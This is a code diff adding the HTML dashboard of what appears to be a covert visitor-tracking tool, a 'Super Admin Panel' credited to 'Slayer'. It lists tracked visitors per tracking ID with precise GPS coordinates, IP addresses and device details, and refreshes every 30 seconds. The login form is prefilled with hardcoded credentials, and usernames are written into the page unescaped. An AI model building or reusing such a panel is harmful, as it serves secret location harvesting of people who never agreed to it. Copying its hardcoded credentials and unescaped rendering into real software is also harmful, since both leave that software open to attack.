@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Super Admin Panel</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1a1a2e;
+            padding: 20px;
+            color: #fff;
+        }
+        .container { max-width: 1400px; margin: 0 auto; }
+        .header {
+            background: #16213e;
+            padding: 25px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .header h1 { color: #e94560; }
+        .header .credit { color: #888; font-size: 14px; }
+        .header .credit a { color: #e94560; text-decoration: none; }
+        .login-box {
+            background: #16213e;
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 400px;
+            margin: 50px auto;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 8px;
+            background: #0f3460;
+            color: #fff;
+            font-size: 14px;
+        }
+        .login-box input::placeholder { color: #888; }
+        .login-box button {
+            width: 100%;
+            padding: 12px;
+            background: #e94560;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .login-box button:hover { background: #c73e54; transform: translateY(-2px); }
+        .dashboard { display: none; }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .stat-card {
+            background: #16213e;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+        }
+        .stat-card h3 { color: #888; font-size: 14px; }
+        .stat-card .number { font-size: 36px; font-weight: bold; color: #e94560; margin-top: 10px; }
+        .admin-card {
+            background: #16213e;
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            border-left: 4px solid #e94560;
+        }
+        .admin-card .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #0f3460;
+            margin-bottom: 15px;
+        }
+        .admin-card .admin-name { color: #e94560; font-size: 20px; font-weight: bold; }
+        .admin-card .admin-stats { color: #888; font-size: 14px; }
+        .visitor-entry {
+            background: #0f3460;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 10px;
+        }
+        .visitor-entry .visitor-header {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            margin-bottom: 10px;
+        }
+        .visitor-entry .visitor-time { color: #888; font-size: 12px; }
+        .visitor-entry .visitor-details {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+        }
+        .visitor-entry .label { color: #888; font-size: 12px; }
+        .visitor-entry .value { font-size: 14px; margin-top: 3px; }
+        .empty-state { text-align: center; padding: 40px; color: #888; }
+        #message { margin-top: 15px; padding: 10px; border-radius: 8px; display: none; }
+        .back-link { color: #e94560; text-decoration: none; }
+        @media (max-width: 768px) {
+            .header { flex-direction: column; gap: 10px; text-align: center; }
+            .stats { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>👑 Super Admin Panel</h1>
+            <div class="credit">Made by <b>Slayer</b> | <a href="https://t.me/voidxio" target="_blank">📱 Telegram</a> | <a href="/admin.html" class="back-link">← Back to Admin</a></div>
+        </div>
+
+        <div id="loginBox" class="login-box">
+            <h2 style="margin-bottom:20px;">Super Admin Login</h2>
+            <input type="text" id="saUsername" placeholder="Username" value="superadmin" />
+            <input type="password" id="saPassword" placeholder="Password" value="slayer2026" />
+            <button onclick="superLogin()">🔐 Login</button>
+            <div id="message"></div>
+        </div>
+
+        <div id="dashboard" class="dashboard">
+            <div class="stats">
+                <div class="stat-card"><h3>👥 Total Admins</h3><div class="number" id="totalAdmins">0</div></div>
+                <div class="stat-card"><h3>👤 Total Visitors</h3><div class="number" id="totalVisitors">0</div></div>
+                <div class="stat-card"><h3>📊 Today's Visitors</h3><div class="number" id="todayVisitors">0</div></div>
+            </div>
+            <div id="adminsList"></div>
+        </div>
+    </div>
+
+    <script>
+        let superToken = localStorage.getItem('superToken');
+
+        if (superToken) {
+            document.getElementById('loginBox').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+            loadSuperData();
+        }
+
+        async function superLogin() {
+            const username = document.getElementById('saUsername').value.trim();
+            const password = document.getElementById('saPassword').value.trim();
+
+            try {
+                const res = await fetch('/api/superadmin/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    superToken = data.token;
+                    localStorage.setItem('superToken', superToken);
+                    document.getElementById('loginBox').style.display = 'none';
+                    document.getElementById('dashboard').style.display = 'block';
+                    loadSuperData();
+                } else {
+                    showMessage('❌ Invalid credentials', true);
+                }
+            } catch (e) {
+                showMessage('❌ Network error', true);
+            }
+        }
+
+        function showMessage(text, isError = false) {
+            const msg = document.getElementById('message');
+            msg.textContent = text;
+            msg.style.display = 'block';
+            msg.style.background = isError ? '#c73e54' : '#2e7d32';
+            msg.style.padding = '10px';
+            msg.style.borderRadius = '8px';
+        }
+
+        async function loadSuperData() {
+            try {
+                const res = await fetch('/api/superadmin/admins', {
+                    headers: { 'Authorization': `Bearer ${superToken}` }
+                });
+                const data = await res.json();
+                if (data.error) {
+                    if (data.error === 'Access denied' || data.error === 'Invalid token') {
+                        localStorage.removeItem('superToken');
+                        window.location.reload();
+                        return;
+                    }
+                    showMessage('❌ ' + data.error, true);
+                    return;
+                }
+
+                document.getElementById('totalAdmins').textContent = data.totalAdmins || 0;
+                
+                let totalVisitors = 0;
+                let todayVisitors = 0;
+                const today = new Date().toDateString();
+                
+                for (let key in data.admins) {
+                    const admin = data.admins[key];
+                    totalVisitors += admin.totalVisitors || 0;
+                    if (admin.visitors) {
+                        todayVisitors += admin.visitors.filter(v => new Date(v.timestamp).toDateString() === today).length;
+                    }
+                }
+                
+                document.getElementById('totalVisitors').textContent = totalVisitors;
+                document.getElementById('todayVisitors').textContent = todayVisitors;
+
+                const container = document.getElementById('adminsList');
+                if (Object.keys(data.admins).length === 0) {
+                    container.innerHTML = '<div class="empty-state">No admins registered yet</div>';
+                    return;
+                }
+
+                container.innerHTML = Object.keys(data.admins).map(key => {
+                    const admin = data.admins[key];
+                    return `
+                        <div class="admin-card">
+                            <div class="admin-header">
+                                <span class="admin-name">${admin.username}</span>
+                                <span class="admin-stats">👥 ${admin.totalVisitors} visitors | 🆔 ${admin.trackingId}</span>
+                            </div>
+                            ${admin.visitors && admin.visitors.length > 0 ? admin.visitors.map((v, i) => {
+                                const loc = v.location || {};
+                                const dev = v.device || {};
+                                return `
+                                    <div class="visitor-entry">
+                                        <div class="visitor-header">
+                                            <strong>Visitor #${i+1}</strong>
+                                            <span class="visitor-time">${new Date(v.timestamp).toLocaleString()}</span>
+                                        </div>
+                                        <div class="visitor-details">
+                                            <div><div class="label">📍 Location</div><div class="value">${loc.lat ? loc.lat.toFixed(4)+', '+loc.lon.toFixed(4) : 'Unknown'}</div></div>
+                                            <div><div class="label">🌐 IP</div><div class="value">${v.ip || 'Unknown'}</div></div>
+                                            <div><div class="label">📱 Device</div><div class="value">${dev.platform || 'Unknown'}</div></div>
+                                            <div><div class="label">🌍 Language</div><div class="value">${dev.language || 'Unknown'}</div></div>
+                                        </div>
+                                    </div>
+                                `;
+                            }).join('') : '<div class="empty-state" style="padding:20px;">No visitors for this admin</div>'}
+                        </div>
+                    `;
+                }).join('');
+            } catch (e) {
+                console.error(e);
+                showMessage('❌ Error loading data', true);
+            }
+        }
+
+        // Auto-refresh every 30 seconds
+        setInterval(() => {
+            if (document.getElementById('dashboard').style.display !== 'none') {
+                loadSuperData();
+            }
+        }, 30000);
+    </script>
+</body>
+</html>
